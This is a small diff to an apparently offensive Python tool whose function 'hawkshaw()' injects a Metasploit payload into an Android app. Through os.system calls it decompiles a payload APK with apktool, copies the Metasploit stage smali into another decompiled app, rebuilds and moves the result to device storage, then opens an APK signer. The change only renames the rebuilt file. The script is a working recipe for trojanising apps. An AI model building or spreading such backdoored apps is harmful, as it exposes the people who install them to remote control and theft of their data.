@@ -103,7 +103,7 @@ def hawkshaw():
 	os.system("cd Malware && apktool d payload.apk -o p")
 	os.system("rm -rf Malware/a/smali/com/metasploit/stage")
 	os.system("mv -f Malware/p/smali/com/metasploit/stage Malware/a/smali/com/")
-	os.system("cd Malware && apktool b a -o HawkShaw.apk")
+	os.system("cd Malware && apktool b a -o a.apk")
 	os.system("cd Malware && rm -rf payload.apk p a")
 	os.system('mv -f Malware/a.apk /storage/emulated/0')
 	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
